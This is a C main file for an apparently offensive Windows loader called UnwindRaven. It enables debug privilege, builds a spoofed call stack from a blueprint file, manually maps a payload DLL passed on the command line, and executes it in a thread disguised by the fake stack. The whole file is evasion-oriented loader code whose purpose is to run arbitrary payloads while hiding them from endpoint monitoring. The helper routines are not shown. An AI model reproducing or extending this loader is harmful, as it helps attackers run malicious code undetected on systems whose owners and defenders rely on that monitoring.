#include <stdio.h>
#include <Windows.h>

#include "unwindraven_core.h"
#include "stack_blueprint.h"
#include "synthetic_stack.h"

int main(int argc, char* argv[])
{
    UR_STACK_CONTEXT sctx;
    UR_LOADER_CONTEXT lctx;
    StackProfileEntry blueprint[MAX_STACK_FRAMES];
    StackFrame targetCallStack[MAX_STACK_FRAMES];
    int blueprintCount = 0;
    int frameCount = 0;
    const CHAR* payloadPath;

    memset(&sctx, 0, sizeof(sctx));
    memset(&lctx, 0, sizeof(lctx));

    EnableDebugPrivilege();

    if (argc < 3) {
        printf("Usage:\n");
        printf("  UnwindRaven.exe --load-blueprint <blueprint.txt> <payload.dll>\n");
        return 0;
    }

    payloadPath = argv[argc - 1];

    if (strcmp(argv[1], "--load-blueprint") == 0 && argc >= 4) {
        const CHAR* bpPath = argv[2];

        if (!LoadBlueprintFile(bpPath, blueprint, &blueprintCount)) {
            return -1;
        }
    } else {
        printf("[-] Unknown mode.\n");
        return -1;
    }

    printf("[!] Blueprint loaded (%d entries).\n", blueprintCount);
    printf("    Press ENTER here to continue and build synthetic stack...\n");
    getchar();

    if (!BuildSyntheticStackFromBlueprint(&sctx,
                                          blueprint,
                                          blueprintCount,
                                          targetCallStack,
                                          &frameCount))
    {
        printf("[-] Error: Failed to resolve any frames.\n");
        return -1;
    }

    DumpSyntheticStack(targetCallStack, frameCount);

    if (!MapPayloadImage(payloadPath, &lctx)) {
        return -1;
    }
    
    printf("[!] Payload mapped successfully at %p.\n", lctx.ImageInfo.Base);
    printf("    Press ENTER to continue and start the spoofed loader thread...\n");
    getchar();

    HANDLE hThread = StartSpoofedLoaderThread(targetCallStack, frameCount, &lctx);
    if (!hThread) {
        return -1;
    }

    // Keep the process alive while the payload does its thing
    WaitForSingleObject(hThread, INFINITE);
    // or, if you prefer manual control:
    // printf("Press ENTER to exit...\n");
    // getchar();

    return 0;
}
